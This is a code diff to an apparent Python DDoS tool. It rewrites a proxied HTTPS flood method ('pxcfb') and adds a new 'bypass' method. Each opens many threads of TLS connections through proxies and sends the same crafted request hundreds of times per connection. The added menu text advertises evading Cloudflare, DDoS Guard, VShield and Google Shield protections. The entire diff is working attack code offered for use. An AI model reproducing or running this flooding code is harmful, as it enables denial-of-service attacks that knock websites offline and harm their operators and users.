@@ -507,31 +507,47 @@ def AttackCFB(url, until_datetime, scraper):
             pass
 #endregion
 
-#region PXCFB
-def LaunchPXCFB(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    scraper = cloudscraper.create_scraper()
+#getCOOOKIE
 
-    for _ in range(int(th)):
-        try:
-            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
-            thd.start()
-        except:
-            pass
+def attackPXCFB(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchPXCFB, args=(url, timer)).start()
 
-def AttackPXCFB(url, until_datetime, scraper):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+def LaunchPXCFB(url, timer):
+    prox = open("./http.txt", 'r').read().split('\n')
+    proxy = random.choice(prox).strip().split(":")
+    timelol = time.time() + int(timer)
+    m = random.choice(method)
+    user_agent = random.choice(useragents)
+    req =  m +" / HTTP/1.3\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += user_agent +"\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
         try:
-            proxy = {
-                    'http': 'http://'+str(random.choice(list(proxies))),   
-                    'https': 'http://'+str(random.choice(list(proxies))),
-            }
-            scraper.get(url, proxies=proxy)
-            scraper.post(url, proxies=proxy)
-            scraper.head(url, proxies=proxy)
+            s = socks.socksocket()
+            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(urlparse(url).netloc), int(443)))
+            ctx = ssl.create_default_context()
+            cipher = [':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK']
+            ctx.set_ciphers(cipher)
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for _ in range(200):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
         except:
-            pass
-#endregion
+            s.close()
 
 #region CFPRO
 def LaunchCFPRO(url, th, t):
@@ -572,7 +588,7 @@ def AttackCFPRO(url, until_datetime, scraper):
             pass
 #endregion
 
-#region CFSOC
+#region
 def LaunchCFSOC(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     target = get_target(url)
@@ -731,7 +747,44 @@ def LaunchSKY(url, timer):
                 s.close()
         except:
             s.close()
+#gbp
+def attackbypass(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=Launchbypass, args=(url, timer)).start()
 
+def Launchbypass(url, timer):
+    prox = open("./http.txt", 'r').read().split('\n')
+    proxy = random.choice(prox).strip().split(":")
+    timelol = time.time() + int(timer)
+    m = random.choice(method)
+    user_agent = random.choice(useragents)
+    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += user_agent +"\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socks.socksocket()
+            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(urlparse(url).netloc), int(443)))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for _ in range(200):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
 def attackSTELLAR(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
@@ -936,12 +989,11 @@ def command():
         LaunchCFB(target, thread, t)
         timer.join()
     elif command == "pxcfb" or command == "PXCFB":
-        if get_proxies():
-            target, thread, t = get_info_l7()
-            timer = threading.Thread(target=countdown, args=(t,))
-            timer.start()
-            LaunchPXCFB(target, thread, t)
-            timer.join()
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackPXCFB, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
     elif command == "get" or command == "GET":
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
@@ -1003,6 +1055,12 @@ def command():
     elif command == "sky":
         target, thread, t = get_info_l7()
         threading.Thread(target=attackSKY, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "bypass":
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackbypass, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
@@ -1088,6 +1146,7 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield with sock5\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"bypass     "+Fore.RED+": "+Fore.WHITE+"HTTPS method without proxies  bypass Google Shield, VShield\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
